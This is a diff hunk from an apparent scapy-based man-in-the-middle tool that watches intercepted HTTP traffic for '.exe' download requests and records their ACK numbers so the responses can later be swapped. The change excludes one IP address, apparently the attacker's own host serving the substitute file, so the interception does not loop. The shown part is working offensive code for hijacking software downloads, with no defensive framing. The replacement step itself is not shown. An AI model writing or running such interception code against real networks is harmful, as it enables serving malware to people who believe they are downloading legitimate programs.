@@ -18,7 +18,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80: # Check if the packet is a request
             print("[+] HTTP Request")
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
+            if ".exe" in str(scapy_packet[scapy.Raw].load) and "172.16.74.12" not in str(scapy_packet[scapy.IP].dst): # Check if the request is for a Windows executable
                 print("[+] Windows executable request")
                 ack_list.append(scapy_packet[scapy.TCP].ack) # Store the ACK number
         elif scapy_packet[scapy.TCP].sport == 80:  # Check if the packet is a response
